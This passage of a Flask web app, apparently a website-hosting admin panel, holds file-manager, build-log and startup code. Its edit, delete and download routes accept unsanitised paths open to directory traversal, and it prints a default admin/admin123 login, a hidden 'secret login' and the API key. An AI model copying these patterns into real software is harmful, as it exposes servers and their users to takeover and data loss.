        adminTabBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                const tabId = this.dataset.tab;
                adminTabBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                document.querySelectorAll('.admin-tab-content').forEach(tc => tc.classList.remove('active'));
                document.getElementById(tabId).classList.add('active');
                if (tabId === 'tabTerminal') { setTimeout(() => terminalCommand.focus(), 100); if (!terminalPollInterval) startTerminalPolling(); }
                if (tabId === 'tabStats') { fetchStats(); if (window.statsInterval) clearInterval(window.statsInterval); window.statsInterval = setInterval(fetchStats, 5000); }
                else { if (window.statsInterval) { clearInterval(window.statsInterval); window.statsInterval = null; } }
            });
        });

        // ----- UTILITY -----
        function escapeHtml(str) { const div = document.createElement('div'); div.textContent = str; return div.innerHTML; }
        function formatUptime(seconds) { if (seconds < 0) return '--'; const d = Math.floor(seconds/86400); const h = Math.floor((seconds%86400)/3600); const m = Math.floor((seconds%3600)/60); const s = Math.floor(seconds%60); return `${d}d ${h}h ${m}m ${s}s`; }

        // ----- EVENT BINDINGS -----
        loginBtn.addEventListener('click', handleLogin);
        document.addEventListener('keydown', function(e) { if (e.key === 'Enter' && loginView.classList.contains('active')) handleLogin(); });
        hamburgerBtn.addEventListener('click', openAdminPanel);
        adminCloseBtn.addEventListener('click', closeAdminPanel);
        adminOverlay.addEventListener('click', function(e) { if (e.target === this) closeAdminPanel(); });
        logoutBtn.addEventListener('click', handleLogout);

        // ----- INIT -----
        const loggedIn = document.querySelector('#userView').classList.contains('active') || false;
        if (loggedIn) {
            loadWebsites();
            loadBots();
            loadAdminUsers();
            setTimeout(() => { if (document.querySelector('#tabTerminal')) startTerminalPolling(); }, 1000);
            setTimeout(fetchStats, 2000);
            setInterval(fetchStats, 30000);
        }

        console.log('🔐 YUVICODEX System ready');
        console.log('📋 Default: admin/admin123');
        console.log('💾 Storage Limit: 10GB');
        console.log('🔑 Click logo 5 times for secret login');

    })();
    </script>
</body>
</html>
"""

# ============================================================
# 📍 ROOT ROUTE
# ============================================================

@app.route('/')
def index():
    settings = load_settings()
    logged_in = 'username' in session
    is_admin = session.get('role') == 'admin' if logged_in else False
    username = session.get('username') if logged_in else ''
    user_password = ''
    if logged_in:
        user_obj = find_user(username)
        if user_obj:
            user_password = user_obj.get('password', '')
    logo_url = settings.get('logo', None)
    if logo_url:
        logo_url = logo_url + '?v=' + str(int(time.time()))
    return render_template_string(
        HTML_TEMPLATE,
        website_name=settings.get('website_name', 'YUVICODEX'),
        logo_url=logo_url,
        social_links=settings.get('social_links', {})
    )

# ============================================================
# 📍 WEBSITE FILES ROUTES
# ============================================================

@app.route('/website/<int:website_id>/files')
@login_required
def website_files(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return "Not found", 404
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    if not os.path.exists(folder):
        return "Folder not found", 404
    items = []
    for root, dirs, files_list in os.walk(folder):
        rel = os.path.relpath(root, folder)
        if rel == '.': rel = ''
        for f in files_list:
            full = os.path.join(root, f)
            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
        for d in dirs:
            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
    return render_template_string("""
    <!DOCTYPE html>
    <html><head><title>Files</title>
    <style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}a{color:#00e5ff;text-decoration:none}.upload-area{margin:15px 0;padding:20px;border:2px dashed rgba(255,255,255,0.2);border-radius:15px;text-align:center}ul{list-style:none}li{display:flex;justify-content:space-between;padding:10px 15px;border-bottom:1px solid rgba(255,255,255,0.05)}</style>
    </head><body><div class="container"><a href="/">← Dashboard</a><h2>{{ website.website_name or website.website_slug }}</h2>
    <div class="upload-area"><input type="file" id="fileUpload" multiple><button onclick="uploadFile()">Upload</button></div>
    <ul>{% for item in items %}<li><span>{% if item.is_dir %}📁 {% else %}📄 {% endif %}{{ item.name }}</span><span>{% if not item.is_dir %}<a href="/website/{{ website.id }}/edit?path={{ item.path }}">✏️</a> <a href="/website/{{ website.id }}/file/download?path={{ item.path }}">⬇️</a>{% endif %} <button onclick="deleteFile('{{ item.path }}')">🗑</button></span></li>{% endfor %}</ul>
    <script>
    function uploadFile(){const f=document.getElementById('fileUpload').files;if(!f.length)return;const fd=new FormData();for(let i=0;i<f.length;i++)fd.append('file',f[i]);fetch('/website/{{ website.id }}/file/upload',{method:'POST',body:fd}).then(()=>location.reload())}
    function deleteFile(p){if(!confirm('Delete?'))return;fetch('/website/{{ website.id }}/file/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})}).then(()=>location.reload())}
    </script></body></html>
    """, website=w, items=items)

@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
@login_required
def website_edit_file(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return "Not found", 404
    file_path = request.args.get('path', '').strip()
    if not file_path:
        return "No path", 400
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
    if not os.path.exists(full) or not os.path.isfile(full):
        return "File not found", 404
    if request.method == 'GET':
        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return render_template_string("""
        <!DOCTYPE html>
        <html><head><title>Edit</title>
        <style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:900px;margin:auto}textarea{width:100%;height:400px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;padding:15px;font-family:monospace;outline:none}.save{background:#00e5ff;border:none;padding:12px 30px;border-radius:50px;color:#000;font-weight:700;cursor:pointer}</style>
        </head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
        """, website=w, file_path=file_path, content=content)
    else:
        with open(full, 'w', encoding='utf-8') as f:
            f.write(request.form.get('content', ''))
        return redirect(f'/website/{website_id}/files')

@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
@login_required
def website_upload_file(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Unauthorized'}), 401
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'Empty'}), 400
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    os.makedirs(folder, exist_ok=True)
    filename = secure_filename(file.filename)
    file.save(os.path.join(folder, filename))
    return jsonify({'success': True})

@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
@login_required
def website_delete_file(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return jsonify({'error': 'Unauthorized'}), 401
    path = request.json.get('path', '').strip()
    if not path:
        return jsonify({'error': 'Path required'}), 400
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
    if not os.path.exists(full):
        return jsonify({'error': 'Not found'}), 404
    if os.path.isdir(full): shutil.rmtree(full)
    else: os.remove(full)
    return jsonify({'success': True})

@app.route('/website/<int:website_id>/file/download', methods=['GET'])
@login_required
def website_download_file(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return "Not found", 404
    path = request.args.get('path', '').strip()
    if not path:
        return "No path", 400
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
    if not os.path.exists(full) or os.path.isdir(full):
        return "File not found", 404
    return send_file(full, as_attachment=True)

@app.route('/website/<int:website_id>/build')
@login_required
def build_logs_page(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return "Not found", 404
    with get_db() as conn:
        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
    return render_template_string("""
    <!DOCTYPE html>
    <html><head><title>Build Logs</title>
    <style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
    </head><body><div class="top-bar"><h2>Build Logs</h2><a href="/">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
    <script>
    const evt = new EventSource('/deploy/{{ website.id }}/logs');
    evt.onmessage = function(e) {
        if (e.data === '[REFRESH]') { location.reload(); return; }
        const div = document.createElement('div');
        div.textContent = e.data;
        document.getElementById('logContainer').appendChild(div);
        document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
    };
    </script></body></html>
    """, website=w, no_logs=not dep)

@app.route('/deploy/<int:website_id>/logs')
@login_required
def deploy_logs_sse(website_id):
    w = get_website_by_id(website_id)
    if not w or w['owner_username'] != session['username']:
        return "Not found", 404
    with get_db() as conn:
        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
    if not dep:
        return "No deployment", 404
    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
    def generate():
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                for line in f:
                    yield f"data: {line.strip()}\n\n"
        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
        while True:
            time.sleep(0.5)
            if os.path.exists(log_file):
                cur = os.path.getsize(log_file)
                if cur > last_size:
                    with open(log_file, 'r') as f:
                        f.seek(last_size)
                        for line in f:
                            yield f"data: {line.strip()}\n\n"
                    last_size = cur
            with get_db() as conn:
                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
            if status and status['status'] in ('success', 'failed'):
                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
                break
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

# ============================================================
# 📍 MAIN START
# ============================================================

LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
os.makedirs(LOG_FOLDER, exist_ok=True)

MAIN_START_TIME = int(time.time())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 YUVICODEX ULTIMATE")
    print(f"🌐 Port: {port}")
    print("👤 Admin: admin / admin123")
    print("💾 Storage Limit: 10GB")
    print("🔑 Render API Key: " + (RENDER_API_KEY if RENDER_API_KEY else "NOT SET"))
    print("="*60)
    app.run(host='0.0.0.0', port=port, debug=False)